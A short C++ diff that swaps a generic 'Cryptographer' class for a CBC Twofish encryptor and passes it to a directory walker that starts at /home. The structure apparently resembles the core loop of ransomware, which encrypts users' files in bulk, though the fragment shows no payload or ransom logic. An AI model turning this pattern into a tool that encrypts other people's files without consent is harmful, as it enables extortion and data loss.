@@ -1,11 +1,11 @@
 #include <iostream>
-#include "cryptographer.hpp"
+#include "cbctwofish.hpp"
 #include "walker.hpp"
 #include <fstream>
 
 int main(int argc, char **argv) {
 
-    auto coolCryptor(std::make_shared<Cryptographer>());
+    auto coolCryptor(std::make_shared<CBCTwofish>());
 
     Walker shadowWalker("/home", coolCryptor);
    
